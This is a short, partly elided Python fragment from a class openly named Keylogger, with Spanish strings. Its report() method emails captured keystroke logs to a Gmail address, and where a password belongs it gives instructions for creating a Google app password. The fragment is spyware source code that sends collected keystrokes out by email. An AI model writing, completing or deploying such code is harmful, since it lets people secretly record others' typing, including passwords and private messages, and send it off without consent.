...
class Keylogger: 
    ...
    def send_email(self, subject, body, sender, recipients, password):
        ...
        print(f"\n[i] Email sent Succesfully! \n")

    def report(self):
        email_body = "[+] El keylogger se ha iniciado exitosamente." if self.is_first_run else self.log
        
        self.send_email("Keylogger Report", email_body, "correo@gmail.com", ["correo@gmail.com"], "gestionar tu cuenta de google -> seguridad -> verificacion en dos pasos -> contraseñas de aplicaciones -> nombre de aplicacion -> y te sale una contraseña")
        self.log = ""
